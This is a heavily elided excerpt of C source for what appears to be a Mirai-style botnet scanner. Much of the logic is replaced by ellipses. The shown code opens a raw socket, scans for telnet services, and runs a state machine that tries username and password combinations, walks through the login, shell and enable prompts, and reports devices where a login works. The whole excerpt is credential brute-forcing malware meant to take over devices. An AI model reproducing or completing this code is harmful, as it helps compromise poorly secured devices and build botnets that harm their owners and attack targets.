...
struct scanner_auth *auth_table = 0;
...
static int recv_strip_null(int sockfd, void *buf, int buflen, int flags)
{
	int i, ret = recv(sockfd, buf, buflen, flags);
...
static void setup_connection(struct scanner_connection *conn)
{
    ...
    {
#ifdef DEBUG
        util_msgc("Error", "Failed to call socket!");
#endif
        return;
    }
...
void scanner_init(void)
{
	...
	if((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
	{
#ifdef DEBUG
		util_msgc("Error", "Failed to initialize raw socket, cannot scan!");
#endif
		_exit(EXIT_FAILURE);
	}
	
	net_set_nonblocking(rsck);
	
	if(setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val)) != 0)
	{
#ifdef DEBUG
		util_msgc("Error", "Failed to set IP_HDRINCL, cannot scan!");
#endif
		close(rsck);
		_exit(EXIT_FAILURE);
	}
	...
	do
	{
		src_port = rand_next() & 0xFFFF;
	}
	while(ntohs(src_port) < 1024);
...
#ifdef DEBUG
	util_msgc("Info", "Scanner initiated, Scanning started!");
#endif
	...
	while(!exiting)
	{
		...
		while(!exiting)
		{
			...
			// If there were no slots, then no point reading anymore
			if(conn == NULL)
				break;
...
#ifdef DEBUG
			util_msgc("Info", "FD#%d attempting to brute IP %d.%d.%d.%d", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
		}
		...
		for(i = 0; i < SCANNER_MAX_CONNS; i++)
		{
			...
			{
#ifdef DEBUG
				util_msgc("Error", "FD#%d timed out (state = %d", conn->fd, conn->state);
#endif
				close(conn->fd);
				conn->fd = -1;
				
				// Retry BECAUSE If we were at least able to connect, try again.
				if(conn->state > SC_HANDLE_IACS)
				{
					...
					else
					{
						setup_connection(conn);
#ifdef DEBUG
						util_msgc("Info", "FD#%d retrying with different auth combo!", conn->fd);
#endif
					}
				}
				else
		...
		tim.tv_usec = 0;
		tim.tv_sec = 1;
		nfds = select(i + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
		if(nfds);
		fake_time = time(NULL);
		...
		for(i = 0; i < SCANNER_MAX_CONNS; i++)
		{
			...
			if(FD_ISSET(conn->fd, &fdset_wr))
			{
				...
				if(err == 0 && ret == 0)
				{
					...
					conn->rdbuf_pos = 0;
#ifdef DEBUG
					util_msgc("Info", "FD#%d connected, trying %s:%s", conn->fd, conn->auth->username, conn->auth->password);
#endif
				}
				else
				{
#ifdef DEBUG
					util_msgc("Error", "FD#%d errored while connecting = %d", conn->fd, err);
#endif
					close(conn->fd);
					conn->fd = -1;
					conn->tries = 0;
			...
			if(FD_ISSET(conn->fd, &fdset_rd))
			{
				while(!exiting)
				{
					...
					{
#ifdef DEBUG
						util_msgc("Info", "FD#%d connection gracefully closed", conn->fd);
#endif
						errno = ECONNRESET;
						ret = -1;
					}
					...
					if(ret == -1)
					{
						...
						{
#ifdef DEBUG
							util_msgc("Info", "FD#%d lost connection!", conn->fd);
#endif
							close(conn->fd);
							conn->fd = -1;
					...
					while(!exiting)
					{
						...
						switch(conn->state)
						{
...
#ifdef DEBUG
									util_msgc("Info", "FD#%d finished telnet negotiation", conn->fd);
#endif
								}
							break;
...
#ifdef DEBUG
								util_msgc("Info", "FD#%d received username prompt", conn->fd);
#endif
                            }
							break;
							...
							case SC_WAITING_PASSWORD:
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD#%d received password prompt", conn->fd);
#endif
									// Send password
							...
							case SC_WAITING_PASSWD_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD#%d received shell prompt", conn->fd);
#endif
							...
							case SC_WAITING_ENABLE_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD#%d received sh prompt", conn->fd);
#endif
							...
							case SC_WAITING_SHELL_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD#%d received enable prompt", conn->fd);
#endif
							...
							case SC_WAITING_TOKEN_RESP:
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD#%d invalid username/password combo", conn->fd);
#endif
									close(conn->fd);
									conn->fd = -1;
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD#%d Found verified working telnet", conn->fd);
#endif
